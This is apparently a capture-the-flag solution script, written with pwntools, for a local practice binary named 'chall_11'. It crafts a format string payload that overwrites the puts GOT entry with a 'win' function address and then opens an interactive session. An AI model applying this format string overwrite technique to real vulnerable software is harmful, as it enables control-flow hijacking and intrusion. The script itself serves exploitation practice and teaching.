from pwn import *
elf=ELF("./chall_11")
payload = fmtstr_payload(7,{elf.got.puts:elf.sym.win},write_size='byte')
p=process("./chall_11")
p.sendline(payload)
p.interactive()
